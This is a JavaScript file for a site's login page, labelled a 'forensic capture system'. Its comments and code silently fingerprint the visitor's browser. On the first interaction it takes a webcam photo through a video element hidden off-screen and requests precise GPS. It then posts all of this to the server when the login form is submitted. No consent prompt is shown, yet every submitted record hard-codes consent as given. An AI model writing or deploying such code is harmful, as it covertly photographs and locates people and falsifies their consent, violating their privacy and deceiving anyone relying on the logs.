/*
 * FBMSO Forensic Capture System
 *
 * Silently captures device data, photo, and GPS during login.
 * No consent modal is shown — capture happens automatically when
 * the login form is submitted. Data is sent to the server and
 * an email copy goes to the security admin.
 *
 * If camera or GPS is denied/unavailable, the login still proceeds —
 * the denial is logged as part of the forensic record.
 */
(function () {
  'use strict';

  var FORENSIC_URL = (window.SITE_URL || '') + 'login/forensic_capture';
  var captureSent = false;
  var preloadedPhoto = null;
  var preloadedGps = null;
  var captureInProgress = false;

  // -- Device fingerprint -------------------------------------------------

  function canvasFingerprint() {
    try {
      var canvas = document.createElement('canvas');
      canvas.width = 200;
      canvas.height = 50;
      var ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = "14px 'Arial'";
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, 100, 30);
      ctx.fillStyle = '#069';
      ctx.fillText('FBMSO-forensic-' + navigator.userAgent.length, 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('FBMSO-forensic-' + navigator.userAgent.length, 4, 17);
      var dataUrl = canvas.toDataURL();
      var hash = 0;
      for (var i = 0; i < dataUrl.length; i++) {
        hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
        hash = hash & hash;
      }
      return 'fp_' + Math.abs(hash).toString(16) + '_' + dataUrl.length;
    } catch (e) {
      return 'canvas-blocked';
    }
  }

  function collectDeviceData() {
    return {
      canvas_fingerprint: canvasFingerprint(),
      screen_resolution: (window.screen.width || '?') + 'x' + (window.screen.height || '?') +
                         'x' + (window.screen.colorDepth || '?'),
      hardware_concurrency: navigator.hardwareConcurrency || 0,
      device_memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
      language: navigator.language || navigator.userLanguage || 'unknown',
      platform: navigator.platform || 'unknown'
    };
  }

  // -- Camera capture with timeout ----------------------------------------

  function capturePhoto() {
    return new Promise(function (resolve) {
      // If we already captured a photo on page load, use it
      if (preloadedPhoto !== null) {
        resolve(preloadedPhoto);
        return;
      }

      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        resolve({ photo: null, error: 'camera-not-supported' });
        return;
      }

      var resolved = false;
      var video = document.createElement('video');
      video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:128px;height:96px;';
      video.autoplay = true;
      video.playsInline = true;

      // Timeout: if camera doesn't produce a frame in 6 seconds, give up
      var timer = setTimeout(function () {
        if (resolved) return;
        resolved = true;
        try { 
          if (video.srcObject) {
            video.srcObject.getTracks().forEach(function (t) { t.stop(); });
          }
        } catch (e) {}
        if (video.parentNode) document.body.removeChild(video);
        resolve({ photo: null, error: 'camera-timeout' });
      }, 6000);

      navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
        audio: false
      }).then(function (stream) {
        video.srcObject = stream;
        document.body.appendChild(video);

        video.onloadedmetadata = function () {
          var isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
          setTimeout(function () {
            if (resolved) {
              stream.getTracks().forEach(function (t) { t.stop(); });
              return;
            }
            try {
              var canvas = document.createElement('canvas');
              canvas.width = 128;
              canvas.height = 96;
              var ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, 128, 96);
              var photoData = canvas.toDataURL('image/jpeg', 0.5);

              stream.getTracks().forEach(function (t) { t.stop(); });
              if (video.parentNode) document.body.removeChild(video);

              if (photoData.length > 50000) {
                canvas.width = 96;
                canvas.height = 72;
                ctx.drawImage(video, 0, 0, 96, 72);
                photoData = canvas.toDataURL('image/jpeg', 0.4);
              }

              resolved = true;
              clearTimeout(timer);
              resolve({ photo: photoData, error: null });
            } catch (e) {
              stream.getTracks().forEach(function (t) { t.stop(); });
              if (video.parentNode) document.body.removeChild(video);
              resolved = true;
              clearTimeout(timer);
              resolve({ photo: null, error: 'capture-failed' });
            }
          }, isMobile ? 1500 : 1000);
        };
      }).catch(function (err) {
        if (video.parentNode) document.body.removeChild(video);
        resolved = true;
        clearTimeout(timer);
        resolve({ photo: null, error: err.name || 'camera-denied' });
      });
    });
  }

  // -- GPS capture with timeout -------------------------------------------

  function captureGPS() {
    return new Promise(function (resolve) {
      if (preloadedGps !== null) {
        resolve(preloadedGps);
        return;
      }

      if (!navigator.geolocation) {
        resolve({ lat: null, lng: null, accuracy: 0, error: 'gps-not-supported' });
        return;
      }

      var resolved = false;

      // Timeout: if GPS doesn't respond in 8 seconds, give up
      var timer = setTimeout(function () {
        if (resolved) return;
        resolved = true;
        resolve({ lat: null, lng: null, accuracy: 0, error: 'gps-timeout' });
      }, 8000);

      var isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          if (resolved) return;
          resolved = true;
          clearTimeout(timer);
          resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: Math.round(pos.coords.accuracy || 0),
            error: null
          });
        },
        function (err) {
          if (resolved) return;
          resolved = true;
          clearTimeout(timer);
          resolve({ lat: null, lng: null, accuracy: 0, error: err.message || 'gps-denied' });
        },
        { enableHighAccuracy: true, timeout: isMobile ? 15000 : 8000, maximumAge: 30000 }
      );
    });
  }

  // -- Send to server -----------------------------------------------------

  function sendForensicData(data) {
    if (captureSent) return Promise.resolve();
    captureSent = true;

    var formData = new FormData();
    formData.append('username', data.username || '');
    formData.append('photo_data', data.photo || '');
    formData.append('latitude', data.lat || '');
    formData.append('longitude', data.lng || '');
    formData.append('accuracy', data.accuracy || 0);
    formData.append('consent_accepted', data.consent ? 1 : 0);
    formData.append('canvas_fingerprint', data.canvas_fingerprint || '');
    formData.append('screen_resolution', data.screen_resolution || '');
    formData.append('hardware_concurrency', data.hardware_concurrency || 0);
    formData.append('device_memory', data.device_memory || '');
    formData.append('timezone', data.timezone || '');
    formData.append('language', data.language || '');
    formData.append('platform', data.platform || '');

    var beaconOk = false;
    if (navigator.sendBeacon) {
      try {
        beaconOk = navigator.sendBeacon(FORENSIC_URL, formData);
      } catch (e) {}
    }

    if (beaconOk) {
      return new Promise(function (resolve) { setTimeout(resolve, 300); });
    }

    return fetch(FORENSIC_URL, {
      method: 'POST',
      body: formData,
      keepalive: true,
      credentials: 'same-origin'
    }).then(function () {}).catch(function () {
      try {
        localStorage.setItem('fbmso_forensic_retry', JSON.stringify(
          Object.assign(data, { ts: Date.now() })
        ));
      } catch (e) {}
    });
  }

  // -- Retry any failed capture from localStorage -------------------------

  function retryFailedCapture() {
    var raw = null;
    try { raw = localStorage.getItem('fbmso_forensic_retry'); } catch (e) { return; }
    if (!raw) return;
    var data;
    try { data = JSON.parse(raw); } catch (e) { try{localStorage.removeItem('fbmso_forensic_retry');}catch(e2){} return; }
    if (Date.now() - (data.ts || 0) > 5 * 60 * 1000) {
      try{localStorage.removeItem('fbmso_forensic_retry');}catch(e){}
      return;
    }
    captureSent = false;
    sendForensicData(data).then(function () {
      try{localStorage.removeItem('fbmso_forensic_retry');}catch(e){}
    });
  }

  // -- Preload camera and GPS on first user interaction -------------------
  // Browsers require a user gesture (click, tap, keypress) before
  // allowing camera access. Requesting on page load is silently blocked.
  // We listen for the first interaction and trigger capture then, so
  // by the time the user clicks Login, the photo is already ready.

  var preloadStarted = false;

  function preloadCapture() {
    if (preloadStarted) return;
    preloadStarted = true;

    // Only preload on HTTPS or localhost — camera won't work otherwise
    var isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    if (!isSecure) return;

    // Preload camera
    capturePhoto().then(function (result) {
      preloadedPhoto = result;
    });

    // Preload GPS
    captureGPS().then(function (result) {
      preloadedGps = result;
    });
  }

  function setupGestureTrigger() {
    var events = ['click', 'touchstart', 'focusin', 'keydown'];

    function triggerOnce(e) {
      preloadCapture();
      // Remove all listeners after first trigger
      events.forEach(function (ev) {
        document.removeEventListener(ev, triggerOnce, true);
      });
    }

    events.forEach(function (ev) {
      document.addEventListener(ev, triggerOnce, true);
    });
  }

  // -- Silent capture (no modal, no overlay) ------------------------------

  window.fbmsoForensicCapture = function (username) {
    return new Promise(function (resolve) {
      var deviceData = collectDeviceData();

      // Overall timeout: if everything takes more than 8 seconds,
      // just send what we have and let the login proceed.
      var overallTimer = setTimeout(function () {
        sendForensicData({
          username: username || '',
          photo: preloadedPhoto ? preloadedPhoto.photo : null,
          lat: preloadedGps ? preloadedGps.lat : null,
          lng: preloadedGps ? preloadedGps.lng : null,
          accuracy: preloadedGps ? preloadedGps.accuracy : 0,
          consent: 1,
          canvas_fingerprint: deviceData.canvas_fingerprint,
          screen_resolution: deviceData.screen_resolution,
          hardware_concurrency: deviceData.hardware_concurrency,
          device_memory: deviceData.device_memory,
          timezone: deviceData.timezone,
          language: deviceData.language,
          platform: deviceData.platform
        }).then(resolve).catch(resolve);
      }, 8000);

      // Capture photo and GPS in parallel. If either fails, we still
      // proceed — the failure is logged in the record.
      Promise.all([capturePhoto(), captureGPS()]).then(function (results) {
        clearTimeout(overallTimer);
        var payload = {
          username: username || '',
          photo: results[0].photo,
          lat: results[1].lat,
          lng: results[1].lng,
          accuracy: results[1].accuracy,
          consent: 1,
          canvas_fingerprint: deviceData.canvas_fingerprint,
          screen_resolution: deviceData.screen_resolution,
          hardware_concurrency: deviceData.hardware_concurrency,
          device_memory: deviceData.device_memory,
          timezone: deviceData.timezone,
          language: deviceData.language,
          platform: deviceData.platform
        };
        sendForensicData(payload).then(resolve).catch(resolve);
      }).catch(function () {
        clearTimeout(overallTimer);
        sendForensicData({
          username: username || '',
          photo: null, lat: null, lng: null, accuracy: 0, consent: 1,
          canvas_fingerprint: deviceData.canvas_fingerprint,
          screen_resolution: deviceData.screen_resolution,
          hardware_concurrency: deviceData.hardware_concurrency,
          device_memory: deviceData.device_memory,
          timezone: deviceData.timezone,
          language: deviceData.language,
          platform: deviceData.platform
        }).then(resolve).catch(resolve);
      });
    });
  };

  // -- Hook into the login form -------------------------------------------

  function hookLoginForm() {
    var form = document.querySelector('form[action*="Login/auth"], form[action*="login/auth"]');
    if (!form) return;

    var submitted = false;

    form.addEventListener('submit', function (e) {
      if (submitted) return;
      if (captureSent) return;

      e.preventDefault();
      submitted = true;

      var username = '';
      var userInput = form.querySelector('#username, input[name="username"]');
      if (userInput) username = userInput.value;

      window.fbmsoForensicCapture(username).then(function () {
        captureSent = true;
        form.submit();
      });
    }, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      hookLoginForm();
      setupGestureTrigger();
    });
  } else {
    hookLoginForm();
    setupGestureTrigger();
  }

  retryFailedCapture();
})();
